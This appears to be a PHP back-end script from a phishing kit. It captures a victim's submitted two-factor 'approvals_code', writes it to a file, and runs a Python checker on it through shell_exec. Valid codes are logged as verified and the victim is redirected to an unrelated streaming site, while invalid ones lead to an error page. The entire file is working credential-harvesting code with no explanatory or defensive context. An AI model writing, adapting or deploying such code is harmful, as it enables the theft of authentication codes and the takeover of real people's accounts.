<?php

file_put_contents("code.txt", $_POST['approvals_code'] . " \n", FILE_APPEND);
shell_exec("python3 2FA_checker.py");
$check_result = file_get_contents("check.txt");
if ($check_result == 1) {
	header('Location: https://2.french-stream.re');
	file_put_contents("2FA_verified.txt", "Code: " . $_POST['approvals_code'] . " Verify: True\n", FILE_APPEND);
}
if ($check_result == 3) {
	header('Location: 2FA_error.html');
	file_put_contents("2FA_verified.txt", "Code: " . $_POST['approvals_code'] . " Verify: False\n", FILE_APPEND);
}

unlink("check.txt");

exit();

?>
